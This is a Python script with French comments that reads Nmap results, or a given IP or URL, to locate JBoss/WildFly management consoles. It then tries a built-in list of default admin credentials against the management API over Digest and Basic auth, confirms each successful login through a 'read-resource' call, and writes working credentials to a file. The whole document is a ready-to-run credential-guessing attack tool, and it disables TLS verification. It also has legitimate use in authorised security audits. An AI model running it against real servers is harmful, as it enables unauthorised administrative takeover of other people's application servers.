#!/usr/bin/env python3
"""
Script qui parse un fichier .nmap, identifie les services JBoss WildFly
(HAL Management Console) et teste les credentials par défaut.
Peut aussi prendre une cible directe via -i/-p ou -u.

Vérifie réellement l'authentification via l'API management (opération
read-resource) pour éviter les faux positifs sur les redirections 302.
"""

import re
import sys
import argparse
import requests
from urllib.parse import urlparse
from requests.auth import HTTPDigestAuth, HTTPBasicAuth
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Credentials par défaut connus pour JBoss/WildFly
DEFAULT_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "admin123"),
    ("admin", "password"),
    ("admin", "Admin#70365"),
    ("admin", ""),
    ("jboss", "jboss"),
    ("jboss", "admin"),
    ("root", "root"),
    ("root", "admin"),
    ("wildfly", "wildfly"),
    ("administrator", "administrator"),
    ("admin", "wildfly"),
    ("manager", "manager"),
    ("admin", "jboss"),
    ("admin", "jbossas"),
    ("admin", "jbossadmin"),
    ("admin", "redhat"),
]

# Chemins typiques de la console management
MGMT_PATHS = [
    "/management",
    "/console",
    "/console/index.html",
]

# Endpoint API qui retourne du JSON protégé (management model)
# On l'utilise pour VÉRIFIER une auth réussie de façon fiable.
MGMT_API_ENDPOINT = "/management"


def parse_nmap_file(filename):
    """
    Parse un fichier .nmap et retourne une liste de tuples (host, port, scheme)
    pour les services JBoss WildFly identifiés.
    """
    targets = []

    with open(filename, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()

    # Découpage par hôte
    host_blocks = re.split(r"Nmap scan report for ", content)

    for block in host_blocks[1:]:
        # Récupère le hostname/IP
        first_line = block.splitlines()[0]
        m = re.match(r"(?:([\w.\-]+)\s+\(([\d.]+)\)|([\d.]+|[\w.\-]+))", first_line)
        if m:
            host = m.group(2) if m.group(2) else (m.group(3) or m.group(1))
        else:
            host = first_line.strip()

        # Parcourt les lignes pour trouver les ports ouverts et les services
        lines = block.splitlines()
        current_port = None
        current_scheme = "http"
        is_jboss = False

        for i, line in enumerate(lines):
            # Détection ligne de port
            port_match = re.match(r"^(\d+)/tcp\s+open\s+(\S+)", line)
            if port_match:
                # Si on était sur un port précédent et qu'on a détecté JBoss
                if current_port and is_jboss:
                    targets.append((host, current_port, current_scheme))

                current_port = int(port_match.group(1))
                service = port_match.group(2)
                current_scheme = "https" if "ssl" in service or "https" in service else "http"
                is_jboss = False

            # Détection des marqueurs JBoss/WildFly (détection élargie)
            if current_port:
                line_lower = line.lower()
                if ("jboss" in line_lower or "wildfly" in line_lower
                        or "hal management console" in line_lower
                        or "undertow" in line_lower):
                    is_jboss = True
                if "ssl" in line_lower and "http" in line_lower:
                    current_scheme = "https"

        # Dernier port du bloc
        if current_port and is_jboss:
            targets.append((host, current_port, current_scheme))

    return targets


def parse_url(url):
    """
    Parse une URL (http://url(:port)) et retourne (host, port, scheme).
    Gère les URLs avec ou sans scheme et port.
    """
    if "://" not in url:
        url = "http://" + url

    parsed = urlparse(url)
    scheme = parsed.scheme if parsed.scheme in ("http", "https") else "http"
    host = parsed.hostname
    port = parsed.port

    if not host:
        raise ValueError(f"URL invalide: {url}")

    if port is None:
        port = 8443 if scheme == "https" else 8080

    return host, port, scheme


def _looks_like_login_redirect(response):
    """
    Détermine si une réponse 3xx est en réalité une redirection
    vers une page de login (donc NON authentifié).
    """
    if response.status_code not in (301, 302, 303, 307, 308):
        return False
    location = response.headers.get("Location", "").lower()
    login_markers = ["login", "signin", "sign-in", "auth", "sso", "logon", "index.html", "error"]
    return any(m in location for m in login_markers)


def _verify_auth(url, auth_class, user, pwd):
    """
    Vérifie de façon fiable si les credentials permettent réellement
    d'accéder à une ressource protégée.

    Stratégie :
      1. Requête POST au management API (op read-resource) qui exige une vraie auth.
      2. Confirme via le contenu JSON de réponse.
    """
    try:
        # Requête d'opération management standard qui exige l'authentification
        payload = {"operation": "read-resource", "address": []}
        r = requests.post(
            url,
            json=payload,
            auth=auth_class(user, pwd),
            verify=False,
            timeout=8,
            allow_redirects=False,
            headers={"Content-Type": "application/json"},
        )

        # 401 => échec d'auth
        if r.status_code == 401:
            return False

        # Redirection vers login => NON authentifié (faux positif)
        if _looks_like_login_redirect(r):
            return False

        # Succès réel : réponse JSON de management avec "outcome"
        if r.status_code == 200:
            try:
                data = r.json()
                if isinstance(data, dict) and "outcome" in data:
                    return True
            except ValueError:
                pass
            # 200 sans JSON valide : on considère non confirmé pour éviter les FP
            return False

        return False

    except requests.RequestException:
        return False


def test_credentials(host, port, scheme):
    """
    Teste les credentials par défaut sur l'URL de management de JBoss/WildFly,
    avec vérification réelle de l'authentification.
    """
    print(f"\n[*] Test de {scheme}://{host}:{port}")
    found = []

    base_url = f"{scheme}://{host}:{port}"

    # 1) Vérifie que le endpoint management existe et exige une auth
    mgmt_url = base_url + MGMT_API_ENDPOINT
    try:
        r = requests.get(mgmt_url, verify=False, timeout=5, allow_redirects=False)
        if r.status_code == 401:
            auth_header = r.headers.get("WWW-Authenticate", "")
            print(f"    [+] Endpoint management trouvé (auth requise: "
                  f"{auth_header.split()[0] if auth_header else 'unknown'})")
        elif r.status_code == 200:
            # Accessible sans auth => déjà "ouvert" (info)
            print(f"    [!] Endpoint management accessible SANS authentification (HTTP 200)")
        else:
            print(f"    [i] Endpoint management: HTTP {r.status_code}")
    except requests.RequestException:
        print(f"    [-] Endpoint management {MGMT_API_ENDPOINT} inaccessible")
        return found

    # 2) Établit une baseline : réponse SANS credentials sur l'API
    #    (pour distinguer un vrai succès d'un comportement par défaut)
    try:
        baseline = requests.post(
            mgmt_url,
            json={"operation": "read-resource", "address": []},
            verify=False,
            timeout=8,
            allow_redirects=False,
            headers={"Content-Type": "application/json"},
        )
        baseline_ok = False
        if baseline.status_code == 200:
            try:
                if "outcome" in baseline.json():
                    baseline_ok = True
            except ValueError:
                pass
        if baseline_ok:
            print(f"    [!!!] Management API accessible SANS credentials !")
            found.append(("(none)", "(none)", "None"))
            # On peut s'arrêter ici : pas besoin de brute
            return found
    except requests.RequestException:
        pass

    # 3) Teste chaque credential avec vérification réelle
    for user, pwd in DEFAULT_CREDENTIALS:
        for auth_class in [HTTPDigestAuth, HTTPBasicAuth]:
            if _verify_auth(mgmt_url, auth_class, user, pwd):
                auth_type = "Digest" if auth_class == HTTPDigestAuth else "Basic"
                print(f"    [!!!] SUCCÈS CONFIRMÉ: {user}:{pwd} ({auth_type})")
                found.append((user, pwd, auth_type))
                break  # inutile de tester l'autre méthode d'auth

    if not found:
        print(f"    [-] Aucun credential par défaut valide (auth vérifiée)")

    return found


def main():
    parser = argparse.ArgumentParser(
        description="Teste les credentials par défaut sur les services JBoss WildFly "
                    "(fichier Nmap, IP/port, ou URL)"
    )
    parser.add_argument("nmap_file", nargs="?", help="Fichier .nmap à analyser")
    parser.add_argument("-i", "--ip", help="Adresse IP ou hostname de la cible")
    parser.add_argument("-p", "--port", type=int, help="Port de la cible (avec -i)")
    parser.add_argument("-u", "--url", help="URL complète: http://url(:port)")
    parser.add_argument("-o", "--output", help="Fichier de sortie pour les credentials trouvés")
    args = parser.parse_args()

    targets = []

    # --- Mode URL ---
    if args.url:
        try:
            host, port, scheme = parse_url(args.url)
            targets.append((host, port, scheme))
            print(f"[+] Cible (URL): {scheme}://{host}:{port}")
        except ValueError as e:
            print(f"[-] {e}")
            sys.exit(1)

    # --- Mode IP/Port ---
    elif args.ip:
        port = args.port if args.port else 8080
        scheme = "https" if port in (8443, 9443, 443, 9993) else "http"
        targets.append((args.ip, port, scheme))
        print(f"[+] Cible (IP): {scheme}://{args.ip}:{port}")

    # --- Mode fichier Nmap ---
    elif args.nmap_file:
        print(f"[*] Parsing de {args.nmap_file}...")
        targets = parse_nmap_file(args.nmap_file)

        if not targets:
            print("[-] Aucun service JBoss WildFly trouvé dans le fichier nmap")
            sys.exit(0)

        print(f"[+] {len(targets)} service(s) JBoss WildFly identifié(s):")
        for host, port, scheme in targets:
            print(f"    - {scheme}://{host}:{port}")

    else:
        parser.error("Vous devez fournir un fichier .nmap, ou -i (avec -p), ou -u")

    results = []
    for host, port, scheme in targets:
        found = test_credentials(host, port, scheme)
        for user, pwd, auth_type in found:
            results.append(f"{scheme}://{host}:{port} - {user}:{pwd} ({auth_type})")

    print("\n" + "=" * 60)
    print("RÉSUMÉ")
    print("=" * 60)
    if results:
        print(f"[+] {len(results)} credential(s) par défaut trouvé(s):")
        for r in results:
            print(f"    {r}")
        if args.output:
            with open(args.output, "w") as f:
                f.write("\n".join(results) + "\n")
            print(f"\n[+] Résultats sauvegardés dans {args.output}")
    else:
        print("[-] Aucun credential par défaut n'a fonctionné")


if __name__ == "__main__":
    main()
